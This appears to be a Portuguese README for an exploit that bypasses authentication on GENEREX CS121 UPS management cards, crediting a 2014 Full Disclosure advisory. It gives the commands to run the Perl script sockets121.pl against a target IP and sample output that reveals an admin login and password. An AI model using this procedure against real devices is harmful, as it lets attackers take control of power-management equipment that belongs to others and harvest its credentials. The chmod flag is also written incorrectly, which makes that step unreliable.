# Autenticação Bypass do CS121 da GENEREX
 - Este procedimento foi feito com base do CL121BL,B e F da CM comandos na versão HynetOS 5.XX: ***
 
 Os créditos são totalmente do JKMAC da seclists.org:***
 https://seclists.org/fulldisclosure/2014/May/75

 ## UTILIZAÇÃO
 - Dê permissão de executavel no arquivo sockets121.pl:
 ```bash

 chmod +X sockets121.pl
```

 - A sintaxe do script é ./sockets121.pl (IP), ex: ./sockets121.pl 192.168.10.10
 O processo leva cerca de 10 minutos,caso não apresente o login e senha execute novamente que aparecerá as informações:

 ```bash

./sockets121.pl  192.168.10.10

UPS: <VERSION> CS124-16M32M, ROM-Version: 2.5.X(pduc) - Aug 27, 2010 

Target system parameters (current):
Default Protocol : TCP/IP
Default Driver   : Ethernet
Mac address      : 00-03-05-00-00-00
IP address       : 192.168.10.10
Net Mask         : 255.255.255.0
Default Gateway  : XX.XX.XX.XX
DHCP             : 0.0.0.0
DNS              : 0.0.0.0
Port for tools   : 4000


Procurando login ... 
USER: admin, PASS: hg478wegzsu, ACCOUNT: none

```
